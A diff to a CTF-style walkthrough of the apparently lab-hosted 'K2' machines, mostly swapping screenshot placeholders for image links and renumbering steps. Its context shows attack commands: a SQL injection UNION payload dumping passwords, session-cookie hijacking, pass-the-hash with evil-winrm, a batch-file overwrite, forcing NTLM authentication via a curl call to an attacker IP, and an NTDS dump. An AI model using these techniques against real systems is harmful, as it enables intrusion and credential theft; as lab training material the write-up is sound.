@@ -97,7 +97,7 @@ python3 -m http.server 8080
 
 10.Navigate to `http://admin.k2.thm/dashboard` and use the browser developer tools to replace the session cookie with the captured admin cookie. Refreshing the page grants access to the administrative dashboard.
 
-[SCREEN01]
+<img width="1368" height="632" alt="SCREEN01" src="https://github.com/user-attachments/assets/63fcb8dd-8cd3-40e9-a2fc-372974b7288b" />
 
 11. In the admin dashboard, use Burp Suite to intercept the POST request sent to `/dashboard` when submitting a ticket title, and send it to the Repeater tab for manual SQL injection testing.
 
@@ -139,7 +139,7 @@ title=' UNION SELECT 1,2,group_concat(admin_username,':',admin_password) FROM ad
 Returns: james:Pwd@9tLNrC3!,rose:VrMAogdfxW!9,bob:PasSW0Rd321,steve:St3veRoxx32,cait:PartyAlLDaY!32,xu:L0v3MyDog!3!,ash:PikAchu!IshoesU!
 ```
 
-[SCREEN02]
+<img width="1140" height="777" alt="SCREEN02" src="https://github.com/user-attachments/assets/0c494288-ea09-41ad-b0aa-4df4e532df46" />
 
 13. Use the extracted credentials to log in via SSH as the user `james`.
 
@@ -153,7 +153,7 @@ ssh james@k2.thm
 cat user.txt
 ```
 
-[SCREEN03]
+<img width="435" height="104" alt="SCREEN03" src="https://github.com/user-attachments/assets/2d5904ee-1d1c-4232-b234-1cbcc0f734c5" />
 
 ---
 
@@ -178,7 +178,7 @@ cd /var/log
 grep -iR rose
 ```
 
-[SCREEN05]
+<img width="1026" height="519" alt="SCREEN05" src="https://github.com/user-attachments/assets/8e567c2d-8f8c-4d52-ae37-52f75149eb82" />
 
 > The logs contain rose's password in plaintext. This password is also used as the root account password, indicating credential reuse.
 
@@ -194,7 +194,7 @@ su root
 cat /root/root.txt
 ```
 
-[SCREEN06]
+<img width="318" height="117" alt="SCREEN06" src="https://github.com/user-attachments/assets/f389c7ba-e82f-43a4-a608-41d55df54d53" />
 
 ---
 
@@ -226,7 +226,7 @@ cat .bash_history
 cat /etc/passwd
 ```
 
-[SCREEN04]
+<img width="724" height="522" alt="SCREEN04" src="https://github.com/user-attachments/assets/ac9e2123-9f7a-4a7b-bf54-9c78eeeb162e" />
 
 ---
 
@@ -303,7 +303,7 @@ Host script results:
 
 > This is a Windows Active Directory machine. Kerberos on port 88, LDAP on port 389, WinRM on port 5985, and the RDP banner reveal the machine hostname `K2Server.k2.thm`.
 
-3. Add the discovered machine hostname `K2Server.k2.thm` to `/etc/hosts` ...
+3. Add the discovered machine hostname `K2Server.k2.thm` to `/etc/hosts`.
 
 4. Based on the two full names discovered via `passwd` in the Base Camp section, generate a list of common Active Directory username formats to test.
 
@@ -459,7 +459,7 @@ cd ../Desktop
 type user.txt
 ```
 
-[SCREEN08]
+<img width="690" height="312" alt="SCREEN08" src="https://github.com/user-attachments/assets/9708a9a4-53a1-446f-b531-9ae93229376a" />
 
 ---
 
@@ -471,7 +471,7 @@ type user.txt
 dir C:\Users
 ```
 
-[SCREEN07]
+<img width="523" height="223" alt="SCREEN07" src="https://github.com/user-attachments/assets/deed4ac7-6ff8-4f5a-89d7-2bb71db5f773" />
 
 ---
 
@@ -526,20 +526,20 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 [*] Cleaning up...
 ```
 
-4. ...
+4. Perform a Pass-the-Hash attack using the extracted Administrator NTLM hash to authenticate as Administrator via WinRM, without needing the plaintext password.
 
 ```bash
 evil-winrm -i <TARGET_IP> -u '<USER_NAME>' -H '<HASH>'
 ```
 
-5. Perform a Pass-the-Hash attack using the extracted Administrator NTLM hash to authenticate as Administrator via WinRM, without needing the plaintext password.
+5. Read the flag:
 
 ```bash
 cd ../Desktop
 type root.txt
 ```
 
-[SCREEN09]
+<img width="700" height="287" alt="SCREEN09" src="https://github.com/user-attachments/assets/8878f5bd-ee25-41aa-afee-71465683c810" />
 
 ---
 
@@ -692,7 +692,7 @@ Set-Content -Path "C:\Scripts\backup.bat" -Value 'copy C:\Users\o.armstrong\Desk
 type user.txt
 ```
 
-[SCREEN10]
+<img width="512" height="268" alt="SCREEN10" src="https://github.com/user-attachments/assets/051391ee-f777-489d-87fe-571b0fdfd336" />
 
 ---
 
@@ -734,7 +734,7 @@ responder -I tun0
 curl file://<ATTACKER_IP>/leak.leak.html
 ```
 
-[SCREEN11]
+<img width="1016" height="166" alt="SCREEN11" src="https://github.com/user-attachments/assets/764c8824-9d7a-4abf-9e1f-53a0638bae9c" />
 
 7. Save the captured NTLMv2 hash to a file and crack it with John the Ripper using the rockyou wordlist.
 
@@ -756,7 +756,7 @@ export KRB5CCNAME=Administrator@cifs_K2ROOTDC.k2.thm@K2.THM.ccache
 netexec smb k2rootdc.k2.thm -u Administrator --use-kcache --ntds
 ```
 
-[SCREEN12]
+<img width="1046" height="406" alt="SCREEN12" src="https://github.com/user-attachments/assets/5329dee5-8fa6-4a39-8590-713056015be7" />
 
 9. Use the domain Administrator's NTLM hash extracted by netexec to authenticate to the Root DC via WinRM.
 
@@ -771,4 +771,4 @@ cd ../Desktop
 type root.txt
 ```
 
-[SCREEN13]
+<img width="692" height="300" alt="SCREEN13" src="https://github.com/user-attachments/assets/e6056272-445b-49ad-91be-6a469c0a1aec" />
